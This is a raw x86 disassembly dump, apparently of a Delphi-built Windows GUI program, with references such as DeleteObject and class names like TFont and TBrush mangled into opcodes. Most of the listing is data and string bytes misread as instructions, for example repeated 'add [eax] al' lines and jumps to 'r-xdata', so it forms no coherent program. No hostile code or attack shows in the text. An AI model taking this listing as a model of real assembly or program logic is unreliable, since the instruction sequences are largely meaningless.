add [ esi + 0x48 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
out 0x48 al
add [ 0x640000ff ] dh
out 0x48 al
add [ esi ] dh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
out 0x48 al
add [ 0x640000ff ] bh
out 0x48 al
add [ esi ] bh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4229a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229a8
retn
sub_4229b8
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
sbb [ edx ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sub al [ edx ]
or al 0x0
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xf004032 ] ah
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edx + ebp + 0x42 ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x42 ] dh
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x18004032 ] ah
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
xchg esp eax
sub al [ edx ]
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
call 0x1426d13
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
add al 0x2b
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x900422a ] dl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add al dl
sub eax [ edx ]
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
sub eax [ edx ]
mov eax eax
insb
sub eax [ edx ]
add ecx [ ecx ]
push esp
push eax
outsb
push ebx
je r-xdata
add [ ebx ] ch
inc edx
add [ ebx + 0x422b6cc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
sub eax [ edx ]
push es
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x2b54c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x2b ] ch
inc edx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
bound esi [ ebx + 0x53 ]
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
jl r-xdata
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x422bd490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x42 ] bh
jae r-xdata
rcl [ eax + 0x300422c ] 0xb
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ ebx ] ch
inc edx
add [ esi ] al
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffbe71 ] al
nop
inc ecx
add [ eax - 0x53ffbe70 ] bl
pop [ ecx ]
add [ eax ] eax
std
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2d ] ah
inc edx
inc edx
popad
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ esp + ebp + 0x62070042 ] cl
jae r-xdata
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x422ad890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add al ch
xor al 0x40
inc eax
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add ah cl
popad
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
jmp [ edi + edi + 0x42 ]
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
nop
sub al 0x42
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
popad
imul esp [ ebx + 0x73 ] 0x422d5490
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jo r-xdata
dec ebp
popad
jae r-xdata
inc edx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
outsb
je r-xdata
aas
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0x2c90c08b
inc edx
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edi * 2 + 0x2d ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
dec ebp
jb r-xdata
outsb
push esp
sub eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2d ] ch
insb
or [ edi + 0x72 ] al
popad
jo r-xdata
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
pop eax
inc edx
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edx * 2 + 0x2d ] si
inc edx
add [ eax + 0x62 ] al
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax ] al
add [ eax ] eax
std
[ edx + eax * 2 + 0x54050042 ]
inc esi
outsd
outsb
add [ eax ] al
movsb [ edi ] [ esi ]
sub eax 0x200042
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2e ] al
inc edx
add [ esi + 0x2e ] cl
inc edx
imul esp [ ebx + 0x73 ] 0xffff0001
nop
sub [ esi ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp ] dh
inc edx
add [ eax + 0x2e ] bl
inc edx
add [ ecx ] 0x0
add eax 0x6f6c6f43
jb r-xdata
inc edx
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
add [ eax + eax ] ah
add [ eax ] al
or [ 0x34e00042 ] ch
dec esi
inc edx
jo r-xdata
popad
insd
nop
sub al [ edx ]
in al dx
inc esi
inc edx
add ah dh
inc esi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
js r-xdata
adc [ eax ] al
aam 0x45
inc edx
add ah bl
inc ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add [ eax ] al
inc edx
add [ eax + 0x2d ] bh
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
sub eax 0x34e00042
imul esp [ ebx + 0x73 ] 0xc08b0000
test al 0x2d
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x422f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c00422f ] dh
add [ eax ] al
add [ eax ] cl
sub eax 0x34e00042
inc edx
add [ esi + eax * 2 + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
je r-xdata
inc edx
inc edx
add [ 0x6e6f4654 ] al
sub [ edx ] eax
sbb [ eax ] al
add bh bh
hlt
imul esp [ gs : edi + 0x68 ] 0x422ad474
add al [ eax ]
push es
dec eax
jo r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx + eax * 2 + 0x42 ] dh
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ eax + 0xe004242 ] bh
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
in al 0x49
imul esp [ ebx + 0x73 ] 0x29b40004
inc edx
add al bl
dec eax
inc edx
add al ah
dec eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffbdb9 ] dl
nop
inc ecx
add [ eax - 0x47ffbe70 ] bl
inc edi
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
mov esp 0x700422f
add al 0x54
push eax
outsb
movsb [ edi ] [ esi ]
das
inc edx
add [ eax + 0x2d ] bh
push eax
sub eax [ edx ]
mov ah 0x46
inc edx
add al al
inc esi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
add [ esi + eax * 2 ] al
inc edx
add [ esi + eax * 2 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
aam 0x2a
inc edx
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
imul esp [ ebx + 0x73 ] 0x2ae40007
inc edx
add [ edi + eax * 2 ] bl
inc edx
add [ edi + eax * 2 ] ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + ebp + 0x200042 ] ah
add [ esi ] cl
jo r-xdata
add [ eax ] al
jae r-xdata
inc edx
add [ eax + eax ] al
inc edx
add ah ch
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x30a4c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x30
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax ] cl
sub eax 0x34e00042
sub eax [ edx ]
sbb [ eax ] al
add bh bh
mov al [ 0x1004249 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x6865646f ] al
sub eax [ edx ]
mov ah 0x49
inc edx
add [ ecx + ecx * 2 + 0x10042 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add ah ah
dec ecx
or [ edi + 0x72 ] al
popad
jo r-xdata
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
insb
lea eax [ eax ]
movsb [ edi ] [ esi ]
das
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x2f
inc edx
add [ eax + eax ] bl
add [ eax ] al
or [ 0x34e00042 ] ch
add [ eax ] al
nop
mov esp 0x7004230
push es
push esp
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x58004231 ] al
add [ eax ] al
add ah cl
popad
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah dl
dec ebp
inc edx
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ edi + ecx * 4 + 0x57a40041 ] ch
inc edx
add [ eax - 0x3bffbda9 ] dl
push esi
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
jae r-xdata
jns r-xdata
jae r-xdata
movsb [ edi ] [ esi ]
xor [ edx ] al
js r-xdata
add al 0x24
retn
outsd
push esp
inc edx
add [ eax + eax ] cl
add bh bh
je r-xdata
xor [ edx ] eax
pop es
pop es
push esp
inc ebx
outsd
inc edx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
das
inc edx
add [ eax ] dl
add [ eax ] al
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
push 0x1004255
add [ eax ] al
add [ eax ] al
jae r-xdata
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x4a ] bl
inc edx
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ eax + 0x600424a ] al
push esp
inc edx
jb r-xdata
lea eax [ eax ]
push 0x4231
sub al 0x42
add ah dl
dec esp
inc edx
add ah bl
dec esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
add [ eax ] al
add [ eax ] al
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
xor [ edx ] eax
inc eax
bound eax [ ecx ]
add al 0x0
or [ edi + 0x72 ] al
popad
jo r-xdata
xor [ ecx ] 0x42
add [ eax ] bl
add [ eax ] al
int3
jb r-xdata
imul esp [ ebx + 0x73 ] 0x29b40002
inc edx
add [ eax - 0x3fffbdb5 ] bh
dec ebx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
jb r-xdata
imul esp [ ebx + 0x73 ] 0x30b80004
inc edx
add [ eax + eax ] dl
add bh bh
test [ ebp + 0x42 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
sub_4232a6
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dl
inc edx
add [ eax + 0x33 ] bl
inc edx
add [ eax ] ch
add [ eax ] al
add [ edx + 0x34e00041 ] bh
inc eax
add [ eax - 0x6f ] dl
inc ecx
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffbe71 ] al
nop
inc ecx
add [ esp + ebp * 2 + 0x42 ] al
add [ edi + ecx * 4 - 0x6e1fffbf ] ch
inc ecx
add ah dl
imul eax [ edx ] 0xffffffec
sub al [ eax ]
nop
insb
inc edx
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
fsubr [ ebp + 0x42 ]
add ah bl
insd
inc edx
add ah ch
sub al [ eax ]
pop esp
outsb
inc edx
add ah ch
sub al [ eax ]
shr [ esi + 0x42 ] 0x0
les ebp [ esi + 0x42 ]
add ah ch
sub al [ eax ]
aam 0x6e
inc edx
add [ ebx + ebp * 2 + 0x6de00042 ] bl
inc edx
add [ eax + 0x6e ] ch
inc edx
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
add [ eax ] eax
std
push [ esi + ebp * 2 ]
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
inc eax
jo r-xdata
insd
inc edx
add [ eax + 0x6e ] ch
inc edx
add ah ah
xchg [ edx ] eax
rcl [ ebp - 0x789fffbe ] 0x42
add al cl
xchg ebp eax
inc edx
add [ eax - 0x7d ] dl
inc edx
add [ eax - 0x33ffbd7d ] dh
pop [ edx ]
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42351070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42349470
add [ ebx + esi + 0x42 ] ah
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add al ah
xchg ecx eax
inc ecx
add [ eax + 0x3800427f ] bh
add [ edx ] 0x90
insb
inc edx
add ah ch
add [ edx ] 0xa0
add [ edx ] 0xffffffe0
add [ edx ] 0xffffffdc
insd
inc edx
add [ esp + eax * 4 ] bh
inc edx
add [ eax ] cl
mov [ edx ] eax
add al 0x91
inc edx
add al bl
xchg ecx eax
inc edx
add ah al
outsb
inc edx
add [ edx + edx * 4 - 0x6cffffbe ] ch
inc edx
add [ eax + 0x7d ] al
inc edx
add al ah
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x13ffbfce ] ah
sub al [ eax ]
imul esp [ ebx - 0x73 ] 0x33680040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
popad
nop
fdiv [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
inc edx
jo r-xdata
or al 0x54
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
xor al 0x34
imul esp [ ebx - 0x14 ] 0x40004232
arpl [ ecx ] ax
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc eax
add [ eax ] ch
aaa
inc edx
add [ eax ] dl
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi ] bh
inc edx
add [ eax + eax ] dh
add [ eax ] al
mov al [ 0xffffffffe0004232 ]
xor al 0x40
add [ eax - 0x6f ] dl
inc ecx
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + edx * 4 ] al
inc edx
add [ eax + 0x44004190 ] dl
insb
inc edx
add [ edi + edx * 4 ] dh
inc edx
add al ah
xchg ecx eax
inc ecx
add ah dl
imul eax [ edx ] 0xffffff94
xchg edi eax
inc edx
add [ eax - 0x2bffbd94 ] dl
xchg edi eax
inc edx
add [ eax ] al
cwde
inc edx
add al bl
insd
inc edx
add ah bl
insd
inc edx
add [ eax + ebx * 4 ] dl
inc edx
add [ esi + ebp * 2 + 0x42 ] bl
add [ eax - 0x3fffbd66 ] bl
outsb
inc edx
add [ eax - 0x4bffbd66 ] dh
0x6ed40042 0x42
mov al 0x96
inc edx
add al ah
insd
inc edx
add [ eax + 0x6e ] ch
inc edx
add [ ecx + ebx * 4 + 0x42 ] dl
add ah cl
0x9af40042 0x42
or [ ebx + 0x54050042 ] bl
dec ecx
arpl [ edi + 0x6e ] bp
mov eax eax
dec eax
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
fdiv [ 0x33640042 ]
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x36 ] cl
inc edx
imul esp [ ebx + 0x73 ] 0xc08b0000
jl r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xor al 0x42
add [ eax + eax ] dh
add [ eax - 0x1fffbdcd ] cl
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx + esi * 2 + 0x73180042 ] bh
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
xchg esp eax
xor al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x35
inc edx
add [ eax + eax ] bh
add [ eax ] al
mov al [ 0xffffffffe0004232 ]
xor al 0x40
add [ eax - 0x6f ] dl
inc ecx
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffbd83 ] ch
nop
inc ecx
add [ esp + ebp * 2 + 0x42 ] al
add ah ah
jge r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
imul esp [ ebx + 0x73 ] 0xd4900000
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ ebx ]
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
sub edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6a ] ch
inc edx
add [ eax + 0xa004296 ] bl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004235 ] al
add [ eax ] al
add [ eax - 0x1fffbdcd ] cl
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
call sub_40364c
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423678
les esi [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc edx
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
aaa
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
sub edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
